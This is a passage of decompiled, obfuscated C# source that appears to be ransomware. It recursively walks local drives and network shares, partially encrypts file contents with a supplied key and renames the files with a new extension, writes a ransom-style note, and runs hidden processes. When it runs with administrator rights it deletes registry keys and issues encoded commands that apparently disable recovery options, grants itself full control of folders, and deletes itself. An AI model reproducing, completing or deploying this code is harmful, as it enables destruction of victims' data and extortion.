				File.AppendAllText(eBcYzZJOdxm, getString_0(107393141));
			}
			catch (Exception)
			{
			}
		}
		if (DRPtrRarqnZhQ == getString_0(107393160))
		{
			bTiDiDmJuclvC();
		}
	}

	public static void SZSLZkwYSb()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(yasjygrGJqTJ(getString_0(107393151)), yasjygrGJqTJ(getString_0(107393509)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int jRGoztevgCp(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> niUigdWoQndRu(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107393460)) && !text.Contains(getString_0(107393435)) && !text.Contains(getString_0(107393402)) && !text.ToLower().Contains(getString_0(107393417)) && !text.ToLower().Contains(getString_0(107392860)) && !text.Contains(getString_0(107392867)) && !text.Contains(getString_0(107392846)) && !text.ToLower().Contains(getString_0(107392797)) && !text.ToLower().Contains(getString_0(107392784)) && !text.ToLower().Contains(getString_0(107392779)) && !text.ToLower().Contains(getString_0(107392770)) && !text.ToLower().Contains(getString_0(107392721)) && !text.ToLower().Contains(getString_0(107392740)) && !text.ToLower().Contains(getString_0(107392695)) && !text.ToLower().Contains(getString_0(107392706)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392681)) && !fileInfo.FullName.Contains(getString_0(107392632)) && !fileInfo.FullName.Contains(getString_0(107392647)) && !fileInfo.FullName.Contains(getString_0(107393110)) && !fileInfo.FullName.Contains(getString_0(107393125)) && !fileInfo.FullName.Contains(getString_0(107393076)) && !fileInfo.FullName.Contains(getString_0(107393091)) && !fileInfo.FullName.Contains(getString_0(107393042)) && !fileInfo.FullName.Contains(getString_0(107393061)) && !fileInfo.FullName.Contains(getString_0(107393008)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393027)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392982)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392997)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392948)) && !fileInfo.FullName.Contains(yasjygrGJqTJ(getString_0(107392963))) && !fileInfo.FullName.Contains(getString_0(107392938)) && !fileInfo.FullName.Contains(getString_0(107392893)) && !fileInfo.FullName.Contains(getString_0(107392908)) && !fileInfo.FullName.EndsWith(getString_0(107395323)) && !fileInfo.FullName.EndsWith(getString_0(107392339)) && !fileInfo.FullName.EndsWith(getString_0(107392366)) && !fileInfo.FullName.EndsWith(getString_0(107392361)) && !fileInfo.FullName.EndsWith(getString_0(107392356)) && !fileInfo.FullName.Contains(getString_0(107392351)) && !fileInfo.FullName.Contains(xDhcruhrTvVZb) && !fileInfo.FullName.Contains(eBcYzZJOdxm) && !fileInfo.FullName.Contains(xOMcrEjNtvCmv))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(peIBzCUyrIICrp) * 1024.0 * 1024.0 && SqCSaFJrwXuBuO == getString_0(107396883))
						{
							list.Add(fileInfo.FullName);
							syYQfAxPmt(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && SqCSaFJrwXuBuO == getString_0(107396888))
						{
							list.Add(fileInfo.FullName);
							syYQfAxPmt(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string dpCBMnJAbTYLKem(string eTlAFuWAZtunvP = "", string RpJINFUndeo = "")
	{
		string result = getString_0(107393216);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = eTlAFuWAZtunvP,
				Arguments = RpJINFUndeo,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void cWWugKCAwQiFRX(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392334),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string IeLtjAHHavBrLSv(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string yasjygrGJqTJ(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static List<string> CypjWHwXGfD()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(getString_0(107392285));
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item(getString_0(107392300));
					if (!list.Contains(getString_0(107392291) + val2.get_Path().get_Server() + getString_0(107397220) + obj.ToString()!.Replace(getString_0(107392254), getString_0(107393216)).Replace(getString_0(107392245), getString_0(107393216))))
					{
						list.Add(getString_0(107392291) + val2.get_Path().get_Server() + getString_0(107397220) + obj.ToString()!.Replace(getString_0(107392254), getString_0(107393216)).Replace(getString_0(107392245), getString_0(107393216)));
					}
				}
				return list;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
	}

	private static void FwrsrVdxML()
	{
		//IL_0956: Unknown result type (might be due to invalid IL or missing references)
		//IL_095d: Expected O, but got Unknown
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097f: Expected O, but got Unknown
		RllSmpqvVD();
		GptWEElvInK.JeeZzHoryCP();
		KbzkVVvOms = GptWEElvInK.ZbriLKwnXXXFNM();
		List<puGvsBgsJUxcF> list = puGvsBgsJUxcF.qiFQbmWGuNFTOJj();
		foreach (puGvsBgsJUxcF item in list)
		{
			hMYsqEPgcjeZT.Add(item.IPAddress);
		}
		IEBbLHGfuE = KbzkVVvOms.Union(hMYsqEPgcjeZT).ToList();
		foreach (string item2 in IEBbLHGfuE)
		{
			if ((!item2.StartsWith(getString_0(107392268)) && !item2.StartsWith(getString_0(107392263)) && !item2.StartsWith(getString_0(107392222)) && !item2.StartsWith(getString_0(107393216))) || !GptWEElvInK.MCTTpXjUfWbUuA(item2))
			{
				continue;
			}
			try
			{
				if (RzBNrFuKFlhr == getString_0(107396883))
				{
					for (int i = 0; i < GptWEElvInK.GffEwGSOvO.Count; i++)
					{
						dpCBMnJAbTYLKem(getString_0(107392209), getString_0(107392228) + item2 + getString_0(107392187) + GptWEElvInK.GffEwGSOvO[i] + getString_0(107392198) + GptWEElvInK.ZWHOtNXIkEdggdIi[i]);
					}
				}
				else
				{
					dpCBMnJAbTYLKem(getString_0(107392209), getString_0(107392228) + item2 + getString_0(107392193));
				}
			}
			catch
			{
			}
		}
		try
		{
			GptWEElvInK.EcjplzzhQSG ecjplzzhQSG = new GptWEElvInK.EcjplzzhQSG(GptWEElvInK.YIUAYjcffmhySp.fUsKgObpYpZCxC, GptWEElvInK.mHqNBNPTlfVSk.UILdYYMlQZrZS, GptWEElvInK.zcnsGiELoVFwHj.TdEHeGPvmei, GptWEElvInK.olQVuoIZfz.czUkrqxUsQY);
			foreach (string item3 in ecjplzzhQSG)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107392152));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (RzBNrFuKFlhr == getString_0(107396883))
						{
							for (int j = 0; j < GptWEElvInK.GffEwGSOvO.Count; j++)
							{
								dpCBMnJAbTYLKem(getString_0(107392209), getString_0(107392615) + item4.ToString() + getString_0(107392574) + GptWEElvInK.GffEwGSOvO[j] + getString_0(107392198) + GptWEElvInK.ZWHOtNXIkEdggdIi[j]);
							}
						}
						else
						{
							dpCBMnJAbTYLKem(getString_0(107392209), getString_0(107392615) + item4.ToString() + getString_0(107392561));
						}
					}
					catch
					{
					}
					if (!vaSLUTUbjeY.Contains(item4.ToString()))
					{
						vaSLUTUbjeY.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			List<string> list2 = CypjWHwXGfD();
			foreach (string item5 in list2)
			{
				if (item5.Contains(getString_0(107392588)) || item5.Contains(getString_0(107392245)) || item5.Contains(getString_0(107392583)) || item5.Contains(getString_0(107392542)) || item5.Contains(getString_0(107392254)) || item5.Contains(getString_0(107392533)) || item5.Contains(getString_0(107392552)) || item5.Contains(getString_0(107392499)) || item5.ToLower().Contains(getString_0(107393417)) || item5.ToLower().Contains(getString_0(107392860)) || item5.Contains(getString_0(107392470)) || item5.Contains(getString_0(107392481)) || item5.ToLower().Contains(getString_0(107392797)) || item5.ToLower().Contains(getString_0(107392784)) || item5.ToLower().Contains(getString_0(107392779)) || item5.ToLower().Contains(getString_0(107392770)) || item5.ToLower().Contains(getString_0(107392721)) || item5.ToLower().Contains(getString_0(107392695)) || item5.ToLower().Contains(getString_0(107392706)))
				{
					continue;
				}
				try
				{
					if (RzBNrFuKFlhr == getString_0(107396883))
					{
						for (int k = 0; k < GptWEElvInK.GffEwGSOvO.Count; k++)
						{
							dpCBMnJAbTYLKem(getString_0(107392209), getString_0(107392615) + item5 + getString_0(107392574) + GptWEElvInK.GffEwGSOvO[k] + getString_0(107392198) + GptWEElvInK.ZWHOtNXIkEdggdIi[k]);
						}
					}
					else
					{
						dpCBMnJAbTYLKem(getString_0(107392209), getString_0(107392615) + item5 + getString_0(107392561));
					}
				}
				catch
				{
				}
				if (!vaSLUTUbjeY.Contains(item5))
				{
					vaSLUTUbjeY.Add(item5);
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = IeLtjAHHavBrLSv(getString_0(107392436));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(yasjygrGJqTJ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(yasjygrGJqTJ(getString_0(107391851)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(yasjygrGJqTJ(getString_0(107391762)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (KWPVAHhGPhNIICC == getString_0(107396883))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107391749), getString_0(107391708));
				File.WriteAllText(text, yasjygrGJqTJ(getString_0(107391699)), Encoding.ASCII);
				dpCBMnJAbTYLKem(getString_0(107397215), getString_0(107390613) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107390608))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107390608)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107390631))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107390631)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107390590));
		ManagementObjectEnumerator enumerator6 = val.Get().GetEnumerator();
		try
		{
			while (enumerator6.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator6.get_Current();
				if (!vaSLUTUbjeY.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392291), getString_0(107397220)).Replace(getString_0(107391081), getString_0(107392291))
					.Replace(getString_0(107392561), getString_0(107393216))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					vaSLUTUbjeY.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392291), getString_0(107397220)).Replace(getString_0(107391081), getString_0(107392291))
						.Replace(getString_0(107392561), getString_0(107393216))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107392254), getString_0(107393216)) + getString_0(107391072));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator6)?.Dispose();
		}
	}

	public static bool vQLLevSAHRLm()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107391031));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void IxgZHDLTHUruQ(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = yasjygrGJqTJ(getString_0(107390998));
		processStartInfo.Arguments = getString_0(107390969) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool ZEieWhItMXsBY(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ENtcAguOHmDUCIg(string string_0)
	{
		try
		{
			lfAHActFMqi CS_0024_003C_003E8__locals0 = new lfAHActFMqi();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.mrsBMKhLaUfu = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.mrsBMKhLaUfu);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107390964);
		}
		catch
		{
			return false;
		}
	}

	public static string NpueiVmmpoUARB(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void auEwOkBUFBp()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = IeLtjAHHavBrLSv(getString_0(107390987));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(yasjygrGJqTJ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390849)));
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390312)));
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390263)));
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390238)));
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390998)));
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390245)));
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390216)));
					registryKey.Close();
				}
				string_ = IeLtjAHHavBrLSv(getString_0(107390167));
				registryKey = Registry.LocalMachine.OpenSubKey(yasjygrGJqTJ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390070)));
					registryKey.Close();
				}
				string_ = IeLtjAHHavBrLSv(getString_0(107390085));
				registryKey = Registry.LocalMachine.OpenSubKey(yasjygrGJqTJ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390070)));
					registryKey.Close();
				}
				string_ = IeLtjAHHavBrLSv(getString_0(107390085));
				registryKey = Registry.CurrentUser.OpenSubKey(yasjygrGJqTJ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(yasjygrGJqTJ(getString_0(107390070)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107390548)), yasjygrGJqTJ(getString_0(107390563)));
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107390482)), yasjygrGJqTJ(getString_0(107390505)));
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107390482)), yasjygrGJqTJ(getString_0(107390327)));
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389754)), yasjygrGJqTJ(getString_0(107389769)));
		}
		catch
		{
		}
	}

	public static void ulbKceXLNzC(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(yasjygrGJqTJ(getString_0(107389696)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void idgipesIlmkq()
	{
		string string_ = IeLtjAHHavBrLSv(getString_0(107389671));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(yasjygrGJqTJ(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(yasjygrGJqTJ(getString_0(107389558)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void RllSmpqvVD()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107397040)), yasjygrGJqTJ(getString_0(107397059)));
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107397040)), yasjygrGJqTJ(getString_0(107390037)));
		}
	}

	public static void bTiDiDmJuclvC()
	{
		dpCBMnJAbTYLKem(getString_0(107397215), yasjygrGJqTJ(getString_0(107389923)));
		string text = yasjygrGJqTJ(getString_0(107389217));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107392561) + text + getString_0(107392561) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397215);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void ecfiytuwBKtog(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(eBcYzZJOdxm, getString_0(107389152) + string_0 + getString_0(107389111) + ex.Message + getString_0(107396676));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string hpcvcOchTBoC()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393216);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107389534);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107389045))) ? getString_0(107389059) : getString_0(107389068));
				break;
			case 0:
				text = getString_0(107389050);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107389529);
				break;
			case 4:
				text = getString_0(107389548);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389498) : getString_0(107389539));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389506) : getString_0(107389511)) : getString_0(107389516)) : getString_0(107389493));
				break;
			case 10:
				text = getString_0(107389469);
				break;
			}
		}
		if (text != getString_0(107393216))
		{
			text = getString_0(107389464) + text;
			if (oSVersion.ServicePack != getString_0(107393216))
			{
				text = text + getString_0(107392198) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string OhhtBduWIan(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395285);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107395252)));
				streamWriter.WriteLine(getString_0(107396676));
				streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107393650)));
				streamWriter.WriteLine(string_0);
				if (bpZBDgMzOhYn)
				{
					streamWriter.WriteLine(getString_0(107396676));
					streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107394084)));
					streamWriter.WriteLine(OMlrSKpvSZZjN.GGrCySNwdT());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !dHWQzBpmcn)
				{
					File.AppendAllText(text, getString_0(107394051) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(eBcYzZJOdxm, getString_0(107389483) + ex.Message + getString_0(107396676));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void QvaRAoZOVYdBT(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		tAxVBKFRENS.mDMSdzCjPkWpMP CS_0024_003C_003E8__locals0 = new tAxVBKFRENS();
		CS_0024_003C_003E8__locals0.ZZgSVyiOZYPYtr = string_1;
		CS_0024_003C_003E8__locals0.IGWEZVHTSEwDdW = string_2;
		CS_0024_003C_003E8__locals0.ESkqjLpKLM = string_3;
		CS_0024_003C_003E8__locals0.lQMbYJppRrxbKzZ = string_4;
		WwvaLWuUsMuy = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ESkqjLpKLM);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395949))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !vaSLUTUbjeY.Contains(array[i].Name))
					{
						vaSLUTUbjeY.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!vaSLUTUbjeY.Contains(string_0[j]))
				{
					vaSLUTUbjeY.Add(string_0[j]);
				}
			}
		}
		if (vaSLUTUbjeY.Contains(yasjygrGJqTJ(getString_0(107389394))) && uixeymWYYDLeKYE == getString_0(107396883))
		{
			vaSLUTUbjeY.Remove(yasjygrGJqTJ(getString_0(107389394)));
		}
		Parallel.ForEach(vaSLUTUbjeY, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new tAxVBKFRENS.mDMSdzCjPkWpMP();
			CS_0024_003C_003E8__locals0.WAKkqyKSObcbB = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.xXlXgoquwPP = string_0;
			if (YBZiXtOnyfJCXsA && !hpcvcOchTBoC().Contains(tAxVBKFRENS.getString_0(107389509)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ZEieWhItMXsBY(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.xXlXgoquwPP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (GLHMCZIBTJO == tAxVBKFRENS.getString_0(107396894))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rjKQLtisbh(CS_0024_003C_003E8__locals0.xXlXgoquwPP, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.ZZgSVyiOZYPYtr, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.lQMbYJppRrxbKzZ, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.IGWEZVHTSEwDdW, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.ESkqjLpKLM);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rjKQLtisbh(CS_0024_003C_003E8__locals0.xXlXgoquwPP, CS_0024_003C_003E8__locals0.ZZgSVyiOZYPYtr, CS_0024_003C_003E8__locals0.lQMbYJppRrxbKzZ, CS_0024_003C_003E8__locals0.IGWEZVHTSEwDdW, CS_0024_003C_003E8__locals0.ESkqjLpKLM);
			}
		});
	}

	public static void rjKQLtisbh(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393216));
		List<string> list3 = list2;
		if (ziOEkhTdjqOs == getString_0(107396888))
		{
			if (bGIxAZwJUJakn == getString_0(107396883) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ENtcAguOHmDUCIg(string_0))
			{
				GNIiMQOCajGQmM gNIiMQOCajGQmM = null;
				try
				{
					gNIiMQOCajGQmM = new GNIiMQOCajGQmM(string_0.Replace(getString_0(107397220), getString_0(107393216)));
				}
				catch
				{
					list = niUigdWoQndRu(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					syYQfAxPmt(gNIiMQOCajGQmM.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = niUigdWoQndRu(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = niUigdWoQndRu(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = WvuVfLQcGRdk.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0457;
					}
				}
				if ((cHjaHHbOia == getString_0(107396888) && !item.EndsWith(text)) || LfbVDKLAiBGoZzsY.Contains(item))
				{
					continue;
				}
				if (nSEgZCqbKaXqV == getString_0(107396883))
				{
					try
					{
						if (YzwwFGKYRQ.ObGmZLtKCYVXPi(item))
						{
							YzwwFGKYRQ.zrrspuNzyYvqy(item);
						}
					}
					catch
					{
					}
				}
				LfbVDKLAiBGoZzsY.Add(item);
				if (!wGUqZKpPfawraYO.Contains(Path.GetDirectoryName(item)))
				{
					wGUqZKpPfawraYO.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (TmUHufxiasI == getString_0(107396883) && fileStream.Length > Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024 && !list3.Contains(text))
					{
						if (NovBIDwMVoo == getString_0(107396883))
						{
							foreach (string item2 in EDjNxpdqMiO)
							{
								if (item.ToLower().EndsWith(item2) && PZbbmsztNpThUc == getString_0(107396883))
								{
									if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && PZbbmsztNpThUc == getString_0(107396888))
								{
									try
									{
										OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = ufQnCLzUSY.QCdhmxBPZB(item, Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024);
						byte[] yILmajIKZPh = ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						ufQnCLzUSY.FavttmDwCR(item, yILmajIKZPh);
						if (string_2 != getString_0(107389417))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389417))
					{
						PBYLSHrxDJgoZC(item, item + string_2, WwvaLWuUsMuy);
					}
					else
					{
						PBYLSHrxDJgoZC(item, item + getString_0(107389412), WwvaLWuUsMuy);
					}
				}
				catch (Exception)
				{
				}
				IL_0457:;
			}
		}
	}

